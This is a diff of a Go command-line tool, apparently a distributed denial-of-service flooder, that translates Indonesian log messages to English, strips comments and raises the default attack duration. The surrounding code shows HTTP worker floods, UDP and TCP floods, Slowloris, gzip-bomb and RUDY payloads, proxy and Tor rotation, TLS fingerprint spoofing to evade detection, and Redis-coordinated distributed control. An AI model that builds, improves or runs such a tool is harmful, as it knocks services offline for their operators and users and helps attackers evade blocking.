@@ -31,7 +31,7 @@ import (
 	"golang.org/x/term"
 )
 
-// ==================== BANNER (DENGAN WARNA) ====================
+
 const BANNER = `
 [0;37;40m                                                               [0m
 [0;37;40m                                    [0m
@@ -45,7 +45,7 @@ const BANNER = `
 
 `
 
-// ==================== GLOBAL VARIABLES ====================
+
 var (
 	targetURL     string
 	workers       int
@@ -82,7 +82,7 @@ var (
 	ctx         = context.Background()
 )
 
-// ==================== FUNGSI BANTU UNTUK TERMINAL ====================
+
 func getTerminalWidth() int {
 	width, _, err := term.GetSize(int(os.Stdout.Fd()))
 	if err != nil {
@@ -106,17 +106,17 @@ func truncateText(text string, maxLen int) string {
 	return text[:maxLen-3] + "..."
 }
 
-// ==================== PROXY MANAGER ====================
+
 func fetchProxies() {
 	if !enableProxy && proxyFile == "" {
 		return
 	}
 
 	if proxyFile != "" {
-		fmt.Printf("[*] Membaca proxy dari file: %s\n", proxyFile)
+		fmt.Printf(" Reading proxy from file: %s\n", proxyFile)
 		file, err := os.Open(proxyFile)
 		if err != nil {
-			fmt.Printf("[!] Gagal buka file proxy: %v\n", err)
+			fmt.Printf(" Failed to open proxy file : %v\n", err)
 			return
 		}
 		defer file.Close()
@@ -128,10 +128,10 @@ func fetchProxies() {
 			}
 		}
 		if len(proxyList) > 0 {
-			fmt.Printf("[*] %d proxy dari file siap pakai.\n", len(proxyList))
+			fmt.Printf(" %d proxy file is ready \n", len(proxyList))
 			return
 		}
-		fmt.Println("[!] File proxy kosong, beralih ke download otomatis.")
+		fmt.Println(" Proxy file is empty, switch to auto proxy download..")
 	}
 
 	fmt.Println(" Download proxy ....")
@@ -154,7 +154,7 @@ func fetchProxies() {
 		resp, err := client.Get(src)
 		if err != nil {
 			if verbose {
-				fmt.Printf("[!] Gagal ambil %s: %v\n", src, err)
+				fmt.Printf(" Failed %s: %v\n", src, err)
 			}
 			continue
 		}
@@ -179,7 +179,7 @@ func fetchProxies() {
 		proxyList = append(proxyList, p)
 	}
 
-	fmt.Printf("[*] Menguji %d proxy...\n", len(proxyList))
+	fmt.Printf(" Test %d proxy...\n", len(proxyList))
 	alive := []string{}
 	var muAlive sync.Mutex
 	var wg sync.WaitGroup
@@ -205,7 +205,7 @@ func fetchProxies() {
 	}
 	wg.Wait()
 	proxyList = alive
-	fmt.Printf("[*] %d proxy hidup..\n", len(proxyList))
+	fmt.Printf("  %d life proxy ..\n", len(proxyList))
 }
 
 func getProxy() string {
@@ -219,7 +219,7 @@ func getProxy() string {
 	return p
 }
 
-// ==================== JA3 SPOOF ====================
+
 func randomCipherSuites() []uint16 {
 	all := tls.CipherSuites()
 	rand.Shuffle(len(all), func(i, j int) { all[i], all[j] = all[j], all[i] })
@@ -251,7 +251,7 @@ func newTLSConfig() *tls.Config {
 	return cfg
 }
 
-// ==================== UDP/TCP FLOOD ====================
+
 func udpFlood(host string, port int) {
 	if !enableUDP {
 		return
@@ -287,7 +287,7 @@ func tcpFlood(host string, port int) {
 	}
 }
 
-// ==================== SLOWLORIS ====================
+
 func slowlorisAttack(host string, port int) {
 	if !enableSlowloris {
 		return
@@ -320,7 +320,7 @@ func slowlorisAttack(host string, port int) {
 	}
 }
 
-// ==================== PAYLOAD GENERATOR ====================
+
 func randString(n int) string {
 	b := make([]byte, n)
 	for i := range b {
@@ -360,7 +360,7 @@ func gzipBomb() []byte {
 	return buf.Bytes()
 }
 
-// ==================== HTTP WORKER ====================
+
 func httpWorker(methodList []string) {
 	defer wg.Done()
 	tr := &http.Transport{
@@ -462,7 +462,7 @@ func httpWorker(methodList []string) {
 	}
 }
 
-// ==================== STATS PRINTER ADAPTIF LAYAR HP (DENGAN 🌪) ====================
+
 func statsPrinter() {
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
@@ -477,18 +477,18 @@ func statsPrinter() {
 			rate := total / 2
 
 			width := getTerminalWidth()
-			// Bangun string statistik tanpa ANSI untuk dihitung panjangnya
-			raw := fmt.Sprintf(" 🎆 Total: %d | Sukses: %d | Gagal: %d | Rate: %d req/s", total, success, failed, rate)
+		
+			raw := fmt.Sprintf(" 🎆 Total: %d | Success: %d | Failed: %d | Rate: %d req/s", total, success, failed, rate)
 			clean := stripANSI(raw)
 			cleanLen := len(clean)
 
 			if cleanLen <= width {
-				// Muat dalam satu baris
-				fmt.Printf("\r\033[93m 🎆 Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
+
+				fmt.Printf("\r\033[93m 🎆 Total: \033[97m%d \033[93m| Success: \033[92m%d \033[93m| Failed: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
 					total, success, failed, rate)
 			} else {
-				// Tidak muat → cetak dalam 2 baris
-				line1 := fmt.Sprintf("Total: %d | Sukses: %d | Gagal: %d", total, success, failed)
+	
+				line1 := fmt.Sprintf("Total: %d | Success: %d | Failed: %d", total, success, failed)
 				line2 := fmt.Sprintf("Rate: %d req/s", rate)
 				maxLineWidth := width - 4
 				if len(line1) > maxLineWidth {
@@ -506,7 +506,6 @@ func statsPrinter() {
 	}
 }
 
-// ==================== REDIS DISTRIBUTED ====================
 func redisListener() {
 	if !enableRedis || rdb == nil {
 		return
@@ -530,12 +529,12 @@ func redisListener() {
 	}
 }
 
-// ==================== MAIN ====================
+
 func main() {
-	// ==================== FLAGS ====================
+	
 	flag.StringVar(&targetURL, "u", "", "Target URL (wajib)")
 	flag.IntVar(&workers, "w", 200, "Jumlah goroutine HTTP")
-	flag.IntVar(&duration, "d", 60, "Durasi dalam detik")
+	flag.IntVar(&duration, "d", 300, "Durasi dalam detik")
 	flag.StringVar(&methods, "m", "GET,POST", "Metode HTTP (pisah koma)")
 	flag.BoolVar(&enableHTTP2, "http2", false, "HTTP/2 multiplexing")
 	flag.BoolVar(&enableProxy, "proxy", false, "Proxy auto-rotate + filter")
@@ -556,7 +555,7 @@ func main() {
 	flag.Parse()
 
 	if targetURL == "" {
-		fmt.Println("[ERROR] Target URL wajib! Gunakan -u")
+		fmt.Println(" Target URL -u")
 		flag.Usage()
 		os.Exit(1)
 	}
@@ -575,7 +574,7 @@ func main() {
 		enableRUDY = true
 	}
 
-	// Parsing methods
+
 	methodList := []string{}
 	for _, m := range strings.Split(methods, ",") {
 		m = strings.TrimSpace(m)
@@ -587,7 +586,7 @@ func main() {
 		methodList = []string{"GET", "POST"}
 	}
 
-	// ==================== INISIALISASI ====================
+
 	fmt.Print(BANNER)
 	parsedURL, _ := url.Parse(targetURL)
 	host := parsedURL.Hostname()
@@ -598,7 +597,7 @@ func main() {
 		port = 443
 	}
 
-	// Redis
+
 	if enableRedis {
 		rdb = redis.NewClient(&redis.Options{
 			Addr: redisAddr,
@@ -615,24 +614,24 @@ func main() {
 	if enableProxy || proxyFile != "" {
 		fetchProxies()
 		if len(proxyList) == 0 {
-			fmt.Println("[!] Tidak ada proxy tersedia, lanjut tanpa proxy.")
+			fmt.Println(" No proxy list, continue without proxy.")
 			enableProxy = false
 		}
 	}
 
 	stopChan = make(chan struct{})
 
-	// ==================== START ATTACK ====================
-	fmt.Printf("\n Sending Requests %s\n", targetURL)
-	fmt.Printf(" Workers: %d, Duration: %ds\n", workers, duration)
-	fmt.Printf(" Methods: %v\n", methodList)
-	fmt.Printf(" HTTP/2: %v, Proxy: %v, Tor: %v\n", enableHTTP2, enableProxy, enableTor)
-	fmt.Printf(" UDP: %v, TCP: %v, Slowloris: %v\n", enableUDP, enableTCP, enableSlowloris)
-	fmt.Printf(" Gzip Bomb: %v, Deep JSON: %v, RUDY: %v\n", enableGzip, enableDeepJSON, enableRUDY)
-	fmt.Printf(" Spoofing: %v, JA3: %v, Redis: %v\n", enableSpoof, enableJA3, enableRedis)
+
+	fmt.Printf("\n  Sending Requests %s\n", targetURL)
+	fmt.Printf("  Workers: %d, Duration: %ds\n", workers, duration)
+	fmt.Printf("  Methods: %v\n", methodList)
+	fmt.Printf("  HTTP/2: %v, Proxy: %v, Tor: %v\n", enableHTTP2, enableProxy, enableTor)
+	fmt.Printf("  UDP: %v, TCP: %v, Slowloris: %v\n", enableUDP, enableTCP, enableSlowloris)
+	fmt.Printf("  Gzip Bomb: %v, Deep JSON: %v, RUDY: %v\n", enableGzip, enableDeepJSON, enableRUDY)
+	fmt.Printf("  Spoofing: %v, JA3: %v, Redis: %v\n", enableSpoof, enableJA3, enableRedis)
 	
 
-	// UDP/TCP/Slowloris background
+
 	if enableUDP {
 		go udpFlood(host, port)
 	}
@@ -646,24 +645,24 @@ func main() {
 		go redisListener()
 	}
 
-	// Stats printer (ADAPTIF dengan 🌪🌪🌪)
+
 	go statsPrinter()
 
-	// HTTP Workers
+
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go httpWorker(methodList)
 	}
 
-	// Timeout / Interrupt
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 
 	select {
 	case <-time.After(time.Duration(duration) * time.Second):
-		fmt.Println("\n[+] Attack selesai.")
+		fmt.Println("\n Attack finish.")
 	case <-sigChan:
-		fmt.Println("\n[!] Dihentikan oleh pengguna.")
+		fmt.Println("\n Stoped...")
 		if enableRedis && rdb != nil {
 			rdb.Publish(ctx, "lyra_control", "STOP")
 		}
@@ -672,7 +671,6 @@ func main() {
 	close(stopChan)
 	wg.Wait()
 
-	// Final Stats
 	total := atomic.LoadUint64(&stats.total)
 	success := atomic.LoadUint64(&stats.success)
 	failed := atomic.LoadUint64(&stats.failed)
